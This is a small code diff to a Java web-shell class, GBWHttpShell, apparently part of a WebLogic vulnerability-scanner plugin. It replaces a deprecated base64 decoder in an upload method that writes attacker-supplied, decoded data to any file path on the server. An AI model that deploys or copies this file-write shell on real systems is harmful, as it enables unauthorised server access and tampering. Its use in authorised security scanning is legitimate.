@@ -1,6 +1,8 @@
 package com.gbw.scanner.plugins.scripts.weblogic.shell;
 
-import sun.misc.BASE64Decoder;
+
+
+import com.gbw.scanner.utils.Base64Utils;
 
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
@@ -36,7 +38,7 @@ public class GBWHttpShell {
     public static void upload(String path, String text){
         try {
             FileOutputStream fileOutputStream = new FileOutputStream(path);
-            fileOutputStream.write(new BASE64Decoder().decodeBuffer(URLDecoder.decode(text,"utf-8")));
+            fileOutputStream.write(Base64Utils.decode(URLDecoder.decode(text,"utf-8")).getBytes());
             fileOutputStream.flush();
             fileOutputStream.close();
         }catch (Exception e) {
